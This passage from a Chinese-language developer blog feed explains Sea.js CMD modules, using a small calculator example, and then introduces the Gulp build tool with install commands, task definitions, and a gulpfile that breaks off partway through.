&#39;基础路径&#39; })</code> 来配置基础路径</li></ul></li><li>绝对路径和根路径始终相对当前页面解析。</li><li>相对标识永远相对于当前文件</li><li><code>seajs.use</code> 中的相对路径始终相对当前页面来解析。</li></ul><h4 id="module"><a href="#module" class="headerlink" title="module"></a>module</h4><p>module 是一个对象，上面存储了与当前模块相关联的一些属性和方法。</p><ul><li><code>module.id</code><ul><li>模块的唯一标识，可以通过 <code>define</code> 方法的第一个参数来指定，默认为该模块文件的绝对路径</li></ul></li><li><code>module.uri</code><ul><li>模块的绝对路径</li></ul></li><li><code>module.dependencies</code><ul><li>dependencies 是一个数组，表示当前模块的依赖</li></ul></li><li><code>module.exports</code><ul><li>当前模块对外提供的接口对象</li><li>相当于每个模块内部最终都执行了这么一句话：<code>return module.exports</code></li><li>模块与模块之间的通信接口</li></ul></li></ul><h4 id="exports"><a href="#exports" class="headerlink" title="exports"></a>exports</h4><p>exports 仅仅是 module.exports 的一个引用。也就是说修改了 exports 就相当于修改了 module.exports。</p><p>但是一旦在 factory 内部给 exports 重新赋值，并不会改变 module.exports 的值。因此给 exports 赋值是无效的。</p><blockquote><p>return 也是暴露，等于 module.exports</p></blockquote><p>例如 jQuery 模块化</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// support seajs</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">typeof</span> define === <span class="string">"function"</span> &amp;&amp; define.cmd ) &#123;</span><br><span class="line">  define( <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> jQuery; &#125; );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">typeof</span> define === <span class="string">"function"</span> &amp;&amp; define.cmd ) &#123;</span><br><span class="line">  define( <span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123; </span><br><span class="line">    <span class="built_in">module</span>.exports = jQuery;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jQuery 插件包装成模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">factory</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> define === <span class="string">'function'</span> &amp;&amp; define.cmd) &#123;</span><br><span class="line">    define(<span class="function"><span class="keyword">function</span>(<span class="params">require</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> $ = <span class="built_in">require</span>(<span class="string">'jquery'</span>);</span><br><span class="line">      factory($);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)(<span class="function"><span class="keyword">function</span>(<span class="params">$</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// jQuery 的插件代码</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="exports-和-module-exports-的区别"><a href="#exports-和-module-exports-的区别" class="headerlink" title="exports 和 module.exports 的区别"></a>exports 和 module.exports 的区别</h3><ul><li>每个模块内部对外到处的接口对象始终都是 <code>module.exports</code></li><li>可以通过修改 <code>module.exports</code> 或给它赋值改变模块接口对象</li><li><code>exports</code> 是 <code>module.exports</code> 的一个引用，就好比在每一个模块定义最开始的地方写了这么一句代码：<code>var exports = module.exports</code><br>分析下面代码：</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">module</span> = &#123;</span><br><span class="line">  exports: &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeExports</span> (<span class="params">exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// var exports = module.exports</span></span><br><span class="line">  exports.foo = <span class="string">'bar'</span></span><br><span class="line">  <span class="comment">// 这里赋值拿不到，不要使用使用</span></span><br><span class="line">  <span class="comment">// exports = function () &#123;&#125;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">module</span>.exports</span><br><span class="line">&#125;</span><br><span class="line">changeExports(<span class="built_in">module</span>.exports, <span class="built_in">module</span>)</span><br></pre></td></tr></table></figure><h3 id="如何将一个普通的模块文件改造为兼容-CMD-规范的模块"><a href="#如何将一个普通的模块文件改造为兼容-CMD-规范的模块" class="headerlink" title="如何将一个普通的模块文件改造为兼容 CMD 规范的模块"></a>如何将一个普通的模块文件改造为兼容 CMD 规范的模块</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> define === <span class="string">"function"</span> &amp;&amp; define.cmd) &#123;</span><br><span class="line">  <span class="comment">// 有 Sea.js 等 CMD 模块加载器存在</span></span><br><span class="line">  define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 使用 module.exports 向外暴露接口对象</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="高级配置-seajs-config-options"><a href="#高级配置-seajs-config-options" class="headerlink" title="高级配置 seajs.config(options)"></a>高级配置 <code>seajs.config(options)</code></h3><p>可以对 Sea.js 进行配置，让模块编写、开发调试更方便。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">seajs.config(&#123;</span><br><span class="line">  <span class="comment">// 别名配置</span></span><br><span class="line">  alias: &#123;</span><br><span class="line">    <span class="string">'es5-safe'</span>: <span class="string">'gallery/es5-safe/0.9.3/es5-safe'</span>,</span><br><span class="line">    <span class="string">'json'</span>: <span class="string">'gallery/json/1.0.2/json'</span>,</span><br><span class="line">    <span class="string">'jquery'</span>: <span class="string">'jquery/jquery/1.10.1/jquery'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 路径配置</span></span><br><span class="line">  paths: &#123;</span><br><span class="line">    <span class="string">'gallery'</span>: <span class="string">'https://a.alipayobjects.com/gallery'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// Sea.js 的基础路径</span></span><br><span class="line">  base: <span class="string">'http://example.com/path/to/base/'</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="使用-SeaJS-开发计算器案例"><a href="#使用-SeaJS-开发计算器案例" class="headerlink" title="使用 SeaJS 开发计算器案例"></a>使用 SeaJS 开发计算器案例</h3><ul><li>index.html</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;SeaJS - 计算器案例&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;input type=<span class="string">"text"</span> id=<span class="string">"x"</span>&gt;</span><br><span class="line">  &lt;select name=<span class="string">""</span> id=<span class="string">"opt"</span>&gt;</span><br><span class="line">    &lt;option value=<span class="string">"0"</span>&gt;+&lt;/option&gt;</span><br><span class="line">    &lt;option value=<span class="string">"1"</span>&gt;-&lt;/option&gt;</span><br><span class="line">    &lt;option value=<span class="string">"2"</span>&gt;*&lt;/option&gt;</span><br><span class="line">    &lt;option value=<span class="string">"3"</span>&gt;<span class="regexp">/&lt;/</span>option&gt;</span><br><span class="line">  &lt;<span class="regexp">/select&gt;</span></span><br><span class="line"><span class="regexp">  &lt;input type="text" id="y"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;button id="cal"&gt;=&lt;/</span>button&gt;</span><br><span class="line">  &lt;input type=<span class="string">"text"</span> id=<span class="string">"result"</span>&gt;</span><br><span class="line">  &lt;!-- </span><br><span class="line">    模块系统：</span><br><span class="line">      <span class="number">1.</span> 定义模块成员</span><br><span class="line">      <span class="number">2.</span> 设定交互规则</span><br><span class="line">    <span class="number">0.</span> 引包</span><br><span class="line">    <span class="number">1.</span> 使用 define 定义一个模块，所有代码写到 define 回调函数中</span><br><span class="line">    <span class="number">2.</span> 使用 <span class="built_in">module</span>.exports 作为模块与模块之间的通信接口对象</span><br><span class="line">    <span class="number">3.</span> 使用 requrie 函数加载模块，执行模块中的代码，得到模块中的 <span class="built_in">module</span>.exports 接口对象</span><br><span class="line">    <span class="number">4.</span> 使用 seajs.use 方法，启动模块系统，类似于电脑开机</span><br><span class="line">   --&gt;</span><br><span class="line">  &lt;script src=<span class="string">"../node_modules/seajs/dist/sea.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    seajs.use(<span class="string">'./js/main'</span>)</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure><ul><li>main.js 文件</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> $ = <span class="built_in">require</span>(<span class="string">'../../node_modules/jquery/dist/jquery'</span>);</span><br><span class="line">  <span class="comment">// 如果想要拿到 jQuery 接口对象，那么 jquery.js 文件内部必须显示的通过 moudle.exports 向外暴露</span></span><br><span class="line">  <span class="keyword">var</span> cal = <span class="built_in">require</span>(<span class="string">'./cal/index'</span>);</span><br><span class="line">  <span class="keyword">var</span> oX = <span class="built_in">document</span>.querySelector(<span class="string">'#x'</span>);</span><br><span class="line">  <span class="keyword">var</span> oOpt = <span class="built_in">document</span>.querySelector(<span class="string">'#opt'</span>);</span><br><span class="line">  <span class="keyword">var</span> oY = <span class="built_in">document</span>.querySelector(<span class="string">'#y'</span>);</span><br><span class="line">  <span class="keyword">var</span> oResult = <span class="built_in">document</span>.querySelector(<span class="string">'#result'</span>);</span><br><span class="line">  <span class="keyword">var</span> oCal = <span class="built_in">document</span>.querySelector(<span class="string">'#cal'</span>);</span><br><span class="line">  oCal.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> opt = oOpt.value;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> x = oX.value;</span><br><span class="line">    <span class="keyword">var</span> y = oY.value;</span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'0'</span>:</span><br><span class="line">        result = cal.add(x, y);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">        result = cal.sub(x, y);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        result = cal.multiply(x, y);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        result = cal.divide(x, y);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    oResult.value = result;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>index.js</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 每个文件模块中默认对外的接口对象就是 module.exports</span></span><br><span class="line"><span class="comment"> * 同时 SeaJS 还提供了一个接口对象 exports</span></span><br><span class="line"><span class="comment"> * 注意：exports 是 module.exports 接口对象的一个引用</span></span><br><span class="line"><span class="comment"> *       也就是说：修改了 exports 相当于修改了 module.exports</span></span><br><span class="line"><span class="comment"> *       但是，如果想要向外部暴露一个单独的变量、函数等成员，</span></span><br><span class="line"><span class="comment"> *       那就必须通过给 module.exports 赋值才可以</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  exports.add = <span class="built_in">require</span>(<span class="string">'./add'</span>);</span><br><span class="line">  exports.sub = <span class="built_in">require</span>(<span class="string">'./sub'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>add.js</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseFloat</span>(x) + <span class="built_in">parseFloat</span>(y);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>sub.js</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseFloat</span>(x) - <span class="built_in">parseFloat</span>(y);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;历史上，JavaScript一直没有模块（module）体系，无法将一个大程序拆分成互相依赖的小文件，再用简单的方法拼装起来。其他语言都有这项功能，比如 Ruby 的 &lt;code&gt;require&lt;/code&gt;、Python 的 &lt;code&gt;import&lt;/code&gt; ，甚至就连 CSS 都有 &lt;code&gt;@import&lt;/code&gt; ，c 语言中的 &lt;code&gt;include&lt;/code&gt;，但是 JavaScript 任何这方面的支持都没有，这对开发大型的、复杂的项目形成了巨大障碍。&lt;/p&gt;
&lt;h2 id=&quot;JavaScript-模块化开发&quot;&gt;&lt;a href=&quot;#JavaScript-模块化开发&quot; class=&quot;headerlink&quot; title=&quot;JavaScript 模块化开发&quot;&gt;&lt;/a&gt;JavaScript 模块化开发&lt;/h2&gt;&lt;h2 id=&quot;模块化介绍&quot;&gt;&lt;a href=&quot;#模块化介绍&quot; class=&quot;headerlink&quot; title=&quot;模块化介绍&quot;&gt;&lt;/a&gt;模块化介绍&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;当你的网站开发越来越复杂的时候，会经常遇到什么问题？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、模块化思想可以让开发更高效&lt;br&gt;2、实现模块化需要解决一个任务，这个任务就是依赖关系&lt;br&gt;3、浏览器端 js 是天然不能实现模块&lt;br&gt;4、有一些库弥补了浏览器端 js 的一些缺陷，实现了模块化并解决了依赖关系&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;将这种库称为模块加载器，RequireJS、SeaJS&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这些模块加载器定义了自己的规范，必须尊早这些规范才能正常工作。&lt;/p&gt;
&lt;p&gt;以 SeaJS 为例子：&lt;/p&gt;
    
    </summary>
    
      <category term="JS系列" scheme="http://yoursite.com/categories/JS%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
      <category term="模块化" scheme="http://yoursite.com/tags/%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Gulp 构建工具</title>
    <link href="http://yoursite.com/2016/02/18/Gulp%20%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7/"/>
    <id>http://yoursite.com/2016/02/18/Gulp 构建工具/</id>
    <published>2016-02-17T16:00:00.000Z</published>
    <updated>2018-06-04T02:59:29.835Z</updated>
    
    <content type="html"><![CDATA[<p>项目构建是指项目上线之前对项目源代码进行一系列处理，使其以最佳的形式运行于线上服务器。常见处理任包括以下几方面：</p><p>1、模块化开发可以实现功能的复用并解决模块间的依赖关系，但带来好处的同时也使得功能代码的碎片化（若干文件）程度增加。</p><p>2、使用less、sass等预处理器，可以降低CSS的维护成本，最终需要将这些预处理器编译成css文件；</p><p>3、对静态资源（css、js、html、images）压缩合并可以提升网页打开速度，提高性能；</p><p>以上任务完如果完全靠手动来完成是非常耗时耗力的且容易出错，实际开发通常借助构建工具来实现。</p><p>所谓构建工具是指通过一系简单配置就可以帮我们实现合并、压缩、校验、预处理等一系列任务的软件工具。</p><p>常见的构建工具包括：Grunt、Gulp、F.I.S（百度出品）、webpack等。</p><blockquote><p>Gulp是基于 Nodejs 开发的一个构建工具，借助 gulp 插件可以实现不同的构建任务，其以简洁的配置和卓越的性能成为目前主流的构建工具。</p></blockquote><p>全局安装</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g gulp</span><br></pre></td></tr></table></figure><h2 id="Gulp基础"><a href="#Gulp基础" class="headerlink" title="Gulp基础"></a>Gulp基础</h2><a id="more"></a><p>1、本地安装 gulp</p><p>进入项目根目录执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install gulp --save-dev</span><br></pre></td></tr></table></figure><p>2、全局安装</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g gulp</span><br></pre></td></tr></table></figure><p>添加–save-dev会在package.json记录依赖关系.</p><p>3、任务清单</p><p>在项目根目录中创建 gulpfile.js，gulp会参考这个配置文件执行构建任务。</p><p>4、定义任务</p><p>在 <code>gulpfile.js</code>定义构建任务，如压缩、合并等。</p><p>gulp 是通过调用插件来完成具体构建任务的，并且这些插件也都基于 Nodejs.</p><p>以编译 LESS 为例，安装</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install gulp-less</span><br></pre></td></tr></table></figure><blockquote><p>使用 gulp, 定义了一个名称为 less 的任务，用来完成 less 编译成 css 的任务。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>);</span><br><span class="line"><span class="keyword">var</span> less = <span class="built_in">require</span>(<span class="string">'gulp-less'</span>);</span><br><span class="line"><span class="comment">// 定义任务 参数[名称，回调函数]</span></span><br><span class="line">gulp.task(<span class="string">'less'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 获取想要转换的路径，相对路径</span></span><br><span class="line">  <span class="comment">// 用来找到要构建的资源 参数[资源路径]</span></span><br><span class="line">  gulp.src(<span class="string">'./public/less/*.less'</span>)</span><br><span class="line">      <span class="comment">// 将资源传给插件 参数[插件调用]</span></span><br><span class="line">      .pipe(less())</span><br><span class="line">      <span class="comment">// 存放路径 将构建的好的资源重新存储 参数[路径]</span></span><br><span class="line">      .pipe(gulp.dest(<span class="string">'./release/css'</span>));</span><br><span class="line">    ;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>5、执行任务</p><p>打开命令行窗口并切换到项目根目录下，执行命令 <code>gulp less</code>，这时全局安装的 gulp 便以我们定义好的 <code>gulpfile.js</code> 执行构建任务了。</p><p>这样LESS文件便会编译成CSS文件，并保存在了./public/css目录下。</p><p>各种插件的使用：</p><h2 id="Gulp工作原理"><a href="#Gulp工作原理" class="headerlink" title="Gulp工作原理"></a>Gulp工作原理</h2><p>通过不同的插件实现构建任务，Gulp只是按着配置文件调用执行了这些插件。</p><p><strong>Gulp API</strong></p><p>Gulp是基于NodeJS的，通过require可以引入一个NodeJS的包（模块），其作用类似于浏览器中的script标签引入资源，被引入的包存放在node_modules目录下。</p><p>引入gulp包（模块）后返回一个对象（习惯赋值给变量gulp），通过该对象提供的方法（API）完成任务的配置。</p><p>1、gulp.task()</p><p>定义各种不同的任务，不同任务间存在依赖关系时，可以指定依赖。</p><p>2、gulp.src()</p><p>需要构建资源的路径，字符串或数组（可以正则方式书写）</p><p>2、gulp.pipe()</p><p>管道，将需要构建的资源“输送”给插件。</p><p>3、gulp.dest()</p><p>构建任务完成后资源存放的路径（会自动创建）</p><p>4、gulp.watch()</p><p>通过监视某静态资源的修改，然后可以调用相应任务。</p><h2 id="常用Gulp插件"><a href="#常用Gulp插件" class="headerlink" title="常用Gulp插件"></a>常用Gulp插件</h2><ul><li><code>gulp-less</code><ul><li>编译LESS文件</li></ul></li><li><code>gulp-autoprefixer</code><ul><li>添加CSS私有前缀</li></ul></li><li><code>gulp-cssmin</code><ul><li>压缩CSS</li></ul></li><li><code>gulp-rname</code><ul><li>重命名</li></ul></li><li><code>gulp-imagemin</code><ul><li>图片压缩</li></ul></li><li><code>gulp-uglify</code><ul><li>压缩Javascript</li></ul></li><li><code>gulp-concat</code><ul><li>合并</li></ul></li><li><code>gulp-htmlmin</code><ul><li>压缩HTML</li></ul></li><li><code>gulp-rev</code><ul><li>添加版本号</li></ul></li><li><code>gulp-rev-collector</code><ul><li>内容替换</li></ul></li><li><code>gulp-useref</code></li><li><code>gulp-if</code></li><li><code>gulp-seajs-transport</code></li></ul><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引包</span></span><br><span class="line"><span class="comment">// 在 node-modules 下找</span></span><br><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>),</span><br><span class="line">  <span class="comment">// 删除文件的</span></span><br><span class="line">  clean = <span class="built_in">require</span>(<span class="string">'gulp-clean'</span>),</span><br><span class="line">  <span class="comment">// 添加 idleading</span></span><br><span class="line">  transport = <span class="built_in">require</span>(<span class="string">'gulp-seajs-transport'</span>),</span><br><span class="line">  concat = <span class="built_in">require</span>(<span class="string">'gulp-seajs-concat'</span>),</span><br><span class="line">  less = <span class="built_in">require</span>(<span class="string">'gulp-less'</span>),</span><br><span class="line">  cssmin = <span class="built_in">require</span>(<span class="string">'gulp-cssmin'</span>),</span><br><span class="line">  autoprefixer = <span class="built_in">require</span>(<span class="string">'gulp-autoprefixer'</span>),</span><br><span class="line">  imagemin = <span class="built_in">require</span>(<span class="string">'gulp-imagemin'</span>),</span><br><span class="line">  uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>),</span><br><span class="line">  concat = <span class="built_in">require</span>(<span class="string">'gulp-concat'</span>),</span><br><span class="line">  htmlmin = <span class="built_in">require</span>(<span class="string">'gulp-htmlmin'</span>),</span><br><span class="line">  rev = <span class="built_in">require</span>(<span class="string">'gulp-rev'</span>),</span><br><span class="line">  revCollector = <span class="built_in">require</span>(<span class="string">'gulp-rev-collector'</span>),</span><br><span class="line">  useref = <span class="built_in">require</span>(<span class="string">'gulp-useref'</span>),</span><br><span class="line">  gulpif = <span class="built_in">require</span>(<span class="string">'gulp-if'</span>),</span><br><span class="line">  rename = <span class="built_in">require</span>(<span class="string">'gulp-rename'</span>),</span><br><span class="line">  base64 = <span class="built_in">require</span>(<span class="string">'gulp-base64'</span>);</span><br><span class="line">gulp.task(<span class="string">'clean'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) 